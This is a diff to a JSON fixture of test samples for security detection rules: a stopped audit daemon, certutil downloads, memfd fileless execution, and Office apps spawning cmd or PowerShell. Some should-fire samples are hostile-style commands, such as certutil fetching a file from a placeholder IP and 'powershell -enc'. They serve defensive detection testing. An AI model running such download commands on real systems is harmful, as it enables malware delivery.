@@ -3,38 +3,21 @@
   "auditd_stopped": {
     "should_fire": [
       {
-        "host": "web-01",
-        "message": "auditd: The audit daemon is stopped"
+        "activity": "daemon_end"
       },
       {
-        "host": "db-02",
-        "message": "systemd: auditd.service: disabled by administrator"
-      },
-      {
-        "host": "app-03",
-        "message": "auditd is shutting down on operator request"
+        "activity": "daemon_abort"
       }
     ],
     "should_not_fire": [
       {
-        "host": "web-01",
-        "message": "auditd: The audit daemon is starting"
+        "activity": "daemon_start"
       },
       {
-        "host": "web-01",
-        "message": "auditd started successfully after reboot"
+        "activity": "service_stop"
       },
       {
-        "host": "web-01",
-        "message": "auditd restarting to reload configuration"
-      },
-      {
-        "host": "web-01",
-        "message": "sshd: service stopped for maintenance"
-      },
-      {
-        "host": "web-01",
-        "message": "auditd: rotating audit logs"
+        "activity": "syscall"
       }
     ]
   },
@@ -42,29 +25,35 @@
     "should_fire": [
       {
         "command_line": "certutil -urlcache -f http://198.51.100.20/a",
-        "parent_image": "cmd.exe"
+        "parent_image": "cmd.exe",
+        "image": "certutil"
       },
       {
         "command_line": "certutil.exe -verifyctl -f http://203.0.113.20/b",
-        "parent_image": "cmd.exe"
+        "parent_image": "cmd.exe",
+        "image": "certutil.exe"
       }
     ],
     "should_not_fire": [
       {
         "command_line": "certutil -store my",
-        "parent_image": "cmd.exe"
+        "parent_image": "cmd.exe",
+        "image": "certutil"
       },
       {
         "command_line": "certutil -dump cert.cer",
-        "parent_image": "cmd.exe"
+        "parent_image": "cmd.exe",
+        "image": "certutil"
       },
       {
         "command_line": "curl -o out http://198.51.100.20/a",
-        "parent_image": "cmd.exe"
+        "parent_image": "cmd.exe",
+        "image": "curl"
       },
       {
         "command_line": "certutil -hashfile payload.bin SHA256",
-        "parent_image": "cmd.exe"
+        "parent_image": "cmd.exe",
+        "image": "certutil"
       }
     ]
   },
@@ -101,26 +90,18 @@
   "memfd_fileless_execution": {
     "should_fire": [
       {
-        "host": "app-01",
-        "message": "type=SYSCALL syscall=memfd_create ... execveat"
-      },
-      {
-        "host": "app-02",
-        "message": "memfd_create used then exec from /proc/self/fd/3"
+        "activity": "memfd execution"
       }
     ],
     "should_not_fire": [
       {
-        "host": "app-01",
-        "message": "type=SYSCALL syscall=memfd_create by systemd-nspawn"
+        "activity": "syscall"
       },
       {
-        "host": "app-01",
-        "message": "execveat /usr/bin/python3"
+        "activity": "execve"
       },
       {
-        "host": "app-01",
-        "message": "type=SYSCALL syscall=openat /proc/self/fd/1"
+        "activity": "daemon_end"
       }
     ]
   },
@@ -128,13 +109,13 @@
     "should_fire": [
       {
         "command_line": "cmd /c script",
-        "image": "C:\\Windows\\System32\\cmd.exe",
-        "parent_image": "C:\\Program Files\\Microsoft Office\\winword.exe"
+        "image": "cmd.exe",
+        "parent_image": "winword.exe"
       },
       {
         "command_line": "powershell -enc",
-        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-        "parent_image": "C:\\Program Files\\Microsoft Office\\excel.exe"
+        "image": "powershell.exe",
+        "parent_image": "excel.exe"
       },
       {
         "command_line": "mshta",
